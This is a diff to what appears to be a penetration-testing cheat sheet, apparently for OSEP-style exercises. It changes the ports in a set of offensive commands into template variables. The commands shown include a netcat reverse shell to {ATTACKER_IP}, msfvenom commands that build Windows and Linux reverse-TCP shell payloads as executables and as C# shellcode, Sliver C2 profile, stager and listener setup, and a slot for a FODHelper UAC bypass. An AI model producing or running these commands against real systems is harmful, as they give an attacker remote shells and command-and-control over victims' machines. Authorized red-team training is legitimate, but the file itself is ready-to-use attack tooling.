@@ -14,28 +14,25 @@ nc -e /bin/sh {ATTACKER_IP} {LPORT}
 
 
 
-
-
-
 #MSFVenom Payloads
 
-msfvenom -p windows/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=82 EXITFUNC=thread -f exe -o pay64.exe
-msfvenom -p windows/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=84 EXITFUNC=thread -f exe -o pay86.exe
-msfvenom -p linux/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=82 EXITFUNC=thread -f elf -o pay64.elf
-msfvenom -p linux/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT=84 EXITFUNC=thread -f elf -o pay86.elf
-
+msfvenom -p windows/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT={SLIV_STAGER_64} EXITFUNC=thread -f exe -o pay64.exe
+msfvenom -p windows/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT={SLIV_STAGER_86} EXITFUNC=thread -f exe -o pay86.exe
+msfvenom -p linux/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT={SLIV_STAGER_64} EXITFUNC=thread -f elf -o pay64.elf
+msfvenom -p windows/x64/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT={SLIV_STAGER_64} EXITFUNC=thread -f csharp
+msfvenom -p windows/shell/reverse_tcp LHOST={ATTACKER_IP} LPORT={SLIV_STAGER_86} EXITFUNC=thread -f csharp
 
 
 
 #Sliver Setup
 
-profiles new --http {ATTACKER_IP}:81 --format shellcode osep64
-stage-listener --url tcp://{ATTACKER_IP}:82 --profile osep64
-http -L {ATTACKER_IP} --lport 81
+profiles new --http {ATTACKER_IP}:{SLIV_LISTENER_64} --format shellcode osep64
+stage-listener --url tcp://{ATTACKER_IP}:{SLIV_STAGER_64} --profile osep64
+http -L {ATTACKER_IP} --lport {SLIV_LISTENER_64}
 
-profiles new --http {ATTACKER_IP}:83 --format shellcode -a x86 osep86
-stage-listener --url tcp://{ATTACKER_IP}:84 --profile osep86
-http -L {ATTACKER_IP} --lport 83
+profiles new --http {ATTACKER_IP}:{SLIV_LISTENER_86} --format shellcode -a x86 osep86
+stage-listener --url tcp://{ATTACKER_IP}:{SLIV_STAGER_86} --profile osep86
+http -L {ATTACKER_IP} --lport {SLIV_LISTENER_86}
 
 
 
@@ -48,6 +45,8 @@ http -L {ATTACKER_IP} --lport 83
 #UAC FODHelper
 
 {UAC_FODHELPER}
+
+
 
 
 
